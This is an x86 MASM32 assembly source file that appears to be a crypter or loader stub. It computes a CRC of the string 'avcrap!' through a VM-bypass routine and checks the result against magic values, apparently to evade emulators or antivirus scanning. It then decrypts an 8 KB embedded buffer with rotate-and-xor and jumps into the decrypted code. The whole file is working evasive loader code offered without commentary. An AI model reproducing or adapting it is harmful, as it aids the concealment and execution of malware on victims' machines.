	.686
	.model flat, stdcall
	option casemap :none
	
	include \masm32\include\ntdll.inc
	includelib \masm32\lib\ntdll.lib
.data
	include Cry.inc
.code
	include VM.inc
	
_imp__RtlComputeCrc32 proto PartialCrc:ULONG, Buffer:PVOID, _Length:ULONG

$Str	CHAR "avcrap!", 0

MAGIC	equ 11000010B

Ip proc
	push sizeof $Str
	push offset $Str
	push 0
	mov eax,esp
	push 3
	push eax
	push dword ptr [_imp__RtlComputeCrc32]
	Call VMBYPASS
	add esp,3*4
	xor eax,0A05DB9D3H
	.if Zero?
		mov eax,edx
		.if Ecx > 16H
			and eax,1111111B
			.if Eax == (MAGIC and 1111111B)
				lea eax,[offset ENCRYPT + edx - MAGIC]
				Jmp Eax
			.endif
		.endif
	.endif
	ret
ENCRYPT:
	mov ecx,2000H/4
	.repeat
		ror dword ptr [ecx*4 + offset Dump - 4],cl
		xor dword ptr [ecx*4 + offset Dump - 4],ecx
		dec ecx
	.until Zero?
	lea eax,Dump
	add eax,600H
	Call Eax
	ret
Ip endp
end Ip